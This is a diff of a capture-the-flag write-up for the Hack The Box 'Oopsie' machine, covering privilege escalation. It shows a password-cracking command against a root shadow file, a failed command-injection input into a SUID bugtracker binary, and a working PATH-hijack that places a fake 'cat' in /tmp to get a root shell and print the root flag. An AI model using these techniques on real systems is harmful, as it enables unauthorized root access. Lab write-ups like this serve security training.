@@ -450,4 +450,44 @@ Awesome. Time to whip out John the Ripper
 kali$  john root-shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-... Turns out, my idea may not have been the correct thought initially. Looks like the insecure use of `cat` was that it didn't specify the filepath. This means we could manipulate the path to execute some program called `cat` as root and gain a shell. 
+... Well, that didn't yield any results sadly. Another idea is to perform command injection when bugtracker asks for an ID. e.g.
+
+```
+robert@oopsie:~$ bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 2 | /bin/bash -i
+---------------
+
+```
+
+No dice unfortunately. After these few attempts, I made a quick reference to the writeup. Looks like the insecure use of `cat` was that it didn't specify the filepath. This means we could manipulate the path to execute some program called `cat` as root and gain a shell. 
+
+
+```
+robert@oopsie:/tmp$ cd /tmp
+robert@oopsie:/tmp$ echo "/bin/bash" > cat
+robert@oopsie:/tmp$ chmod a+x cat
+robert@oopsie:/tmp$ ls -l
+-rwxrwxr-x 1 robert robert   10 Jan 31 09:39 cat
+robert@oopsie:/tmp$ which cat
+/tmp/cat
+robert@oopsie:/tmp$ bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 2
+---------------
+
+root@oopsie:/tmp# whoami
+root
+root@oopsie:/tmp# less /root/root.txt
+af13b0bee69f8a877c3faf667f7beacf
+```
+
+Job done!
